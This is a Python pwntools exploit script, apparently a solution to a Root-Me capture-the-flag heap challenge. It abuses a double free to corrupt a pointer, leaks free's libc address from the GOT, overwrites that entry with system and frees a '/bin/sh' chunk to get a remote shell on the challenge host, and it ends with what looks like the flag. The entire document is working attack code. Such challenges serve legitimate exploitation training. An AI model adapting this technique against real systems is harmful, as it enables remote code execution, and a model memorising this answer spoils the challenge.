from pwn import * 
from struct import *

#io = process('./ch44')
io = remote('challenge03.root-me.org', 56544)


def allocate(name, age):
	io.recvuntil('->')
	io.sendline('1')
	io.recvuntil('Name:')
	io.sendline(name)
	io.recvuntil('Age:')
	io.sendline(str(age))


def delete(idx):
	io.recvuntil('->')
	io.sendline('2')
	io.recvuntil('Entry to delete:')
	io.sendline(str(idx))


def change(idx, name, age):
	io.recvuntil('->')
	io.sendline('3')
	io.recvuntil('change:')
	io.sendline(str(idx))
	io.recvuntil('name:', timeout=1)
	io.sendline(name)
	io.recvuntil('age:', timeout=1)
	io.sendline(str(age))

def show():
	io.recvuntil('->')
	io.sendline('4')
	return io.recvuntil('Menu')


allocate('A'*32, -1)
allocate('B'*32, -1)
allocate('C'*32, -1)
allocate('D'*32, -1)

delete(0)
delete(1)
delete(0)

allocate('D'*32, -1)


#here we control where name[0] is written
allocate('E'*8 + '\x18\x20\x60' + '\x10\x00', -1)

data = show()
leak = str(data)[14:20] + '\x00\x00'
free_libc = hex(struct.unpack('<Q', leak)[0])

free_got = 0x00602018
free_offset_libc223 = 0x00000000000844f0
system_offset_libc223 = 0x0000000000045390

#libc_base_address = int(free_libc, 16) - free_offset_libc223
#system_libc = libc_base_address + system_offset_libc223


######################################################
#		ROOT-ME libc
######################################################
free_offset_libc227 = 0x000097950
system_offset_libc227 = 0x0004f440

libc_base_address = int(free_libc, 16) - free_offset_libc227
system_libc = libc_base_address + system_offset_libc227

print "[*] Libc free leak: {}".format(free_libc)
print "[*] Libc base address: {}".format(hex(libc_base_address))
print "[*] Libc system address: {}".format(hex(system_libc))

#idk but age is sent in the same request that name
fixed_address = str(struct.pack('<Q', system_libc))[0:6]

change(2, '/bin/sh\x00', -1)
change(0, fixed_address, -1)
delete(2)


io.interactive()


"""
Double_Free_Are_Evil
"""
